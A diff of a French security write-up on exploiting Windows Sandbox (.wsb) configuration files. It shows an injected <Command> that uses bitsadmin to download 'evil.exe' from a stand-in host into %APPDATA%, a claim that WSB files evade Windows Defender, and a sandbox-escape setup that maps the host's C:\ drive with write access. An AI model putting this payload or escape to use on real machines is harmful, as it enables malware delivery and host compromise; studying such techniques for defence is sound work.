@@ -29,9 +29,9 @@ voici l'exemple d'un fichier de configuration:
 ### Exploiter les configurations WSB:
 
 
-Une des première méthodes consiste à modifier le champs `<Command>` pour executer notre commande malicieuse et accéder au fichiers systèmes de l'hote, en plus de ça les fichiers WSB
-ne se font pas détecter par Windows Defender.
+Une des première méthodes consiste à modifier le champs `<Command>` pour executer notre commande malicieuse et accéder au fichiers systèmes de l'hote, en plus de ça les fichiers WSB ne se font pas détecter par Windows Defender.
 
+Commande possible d'injecter:
 ```xml
 <Command>bitsadmin /transfer myjob /download /priority high http://legit/evil.exe"%APPDATA%\file">nul&</Command>
 ```
@@ -64,7 +64,7 @@ ne se font pas détecter par Windows Defender.
 
 
 
-
+```
 • Inheriting Write Access permission to Host Machine (Sand-Box-Escape)
 
 # Mapping C:\ root to Sandbox Environment with write access (RW.wsb)
@@ -100,7 +100,7 @@ NOTE : File created in the sand-box environment will directly reflect in the C:\
 NOTE : File created in the sand-box environment will directly reflect in the C:\ folder of Host Machine 
 
 
-
+```
 
 ### étude approfondi de Windows Sandbox:
 
